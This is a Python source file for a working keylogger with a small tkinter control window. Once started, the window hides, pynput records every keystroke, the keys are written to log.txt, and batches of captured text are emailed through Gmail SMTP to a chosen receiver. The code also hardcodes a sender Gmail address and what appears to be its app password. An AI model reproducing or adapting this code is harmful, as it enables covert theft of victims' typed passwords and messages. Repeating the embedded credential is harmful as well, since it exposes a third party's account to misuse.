import tkinter as tk
from tkinter import simpledialog  # Import simpledialog module
from pynput.keyboard import Key, Listener
import smtplib
import ssl

# ... (Rest of your code remains the same)

count = 0
keys = []
keylogger_listener = None
receiver_email = None  # Initialize receiver_email variable
log_file = "log.txt"  # Name of the log file
window = None  # Initialize the main window

def on_press(key):
    print(key, end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

        # Log keys to the log.txt file
        log_keys(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    send_email(message)

def log_keys(keys):
    with open(log_file, "a") as file:
        for key in keys:
            file.write(key + "\n")

def on_release(key):
    if key == Key.esc:
        stop_keylogger()  # Call stop_keylogger when the "Esc" key is pressed
        return False

def start_keylogger():
    global keylogger_listener, window
    window.withdraw()  # Hide the main window
    keylogger_listener = Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

    # Clear the log file when starting the keylogger
    with open(log_file, "w") as file:
        file.write("")

def stop_keylogger():
    global keylogger_listener, window
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None
        window.deiconify()  # Show the main window again

def send_email(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "starkkunu@gmail.com"
    password = "htez nopl xtpx dgnh"

    global receiver_email  # Access the global receiver_email variable

    if receiver_email is None:
        receiver_email = input("Enter the receiver's email address: ")

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        print("Email sent successfully!")

    except Exception as e:
        print("An error occurred:", e)
    finally:
        server.quit()

def get_receiver_email():
    global receiver_email
    # Use a pop-up dialog to get the receiver's email address
    receiver_email = simpledialog.askstring("Receiver's Email", "Enter the receiver's email address:")
    if receiver_email:
        print(f"Receiver's Email: {receiver_email}")

if __name__ == "__main__":
    receiver_email = None  # Initialize receiver_email variable to None

    window = tk.Tk()
    window.title("Keylogger")
    window.geometry("300x150")

    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=10)

    stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
    stop_button.pack(pady=10)

    get_email_button = tk.Button(window, text="Enter Receiver's Email", command=get_receiver_email)
    get_email_button.pack(pady=10)

    window.mainloop()
